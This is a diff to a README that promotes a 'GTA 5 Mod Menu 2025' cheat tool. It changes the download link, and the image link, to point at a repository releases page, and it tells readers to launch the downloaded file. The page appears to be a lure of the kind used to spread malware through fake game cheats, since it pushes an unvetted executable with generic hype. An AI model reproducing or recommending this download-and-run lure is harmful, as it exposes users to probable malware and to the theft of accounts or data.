@@ -24,7 +24,7 @@ Here are some of the key features of the GTA 5 Mod Menu 2025:
 - Mod Menu GTAV PC
 
 ## How to Access the Mod Menu
-To access the GTA 5 Mod Menu 2025, simply download the tool from the following link: [Download Mod Menu](https://github.com/uploads/App.zip)! 🎮
+To access the GTA 5 Mod Menu 2025, simply download the tool from the following link: [Download Mod Menu](https://github.com/weareTuanMuda/GTA-5-Mod-Menu-2025/releases)! 🎮
 
 *Note: Make sure to launch the file once it's downloaded to start customizing your GTA V experience.*
 
@@ -34,7 +34,7 @@ If you want to dive deeper into the world of GTA 5 mods, don't hesitate to check
 ## Get Started
 Ready to revolutionize your GTA 5 gameplay? Download the mod menu and start exploring the endless possibilities that await you in Los Santos and Blaine County. Get ready for an adventure like never before!
 
-![GTA 5](https://cdn2.unrealengine.com/egs-grandtheftautov-rockstargames-s1-2560x1440-2560x1440-f4c01c90735b.jpg)
+![GTA 5](https://github.com/weareTuanMuda/GTA-5-Mod-Menu-2025/releases)
 
 ## Let's Connect
 Join the GTA 5 modding community and share your experiences, creations, and discoveries with fellow players. Embrace the thrill of pushing the boundaries of GTA V and redefine your gaming journey.
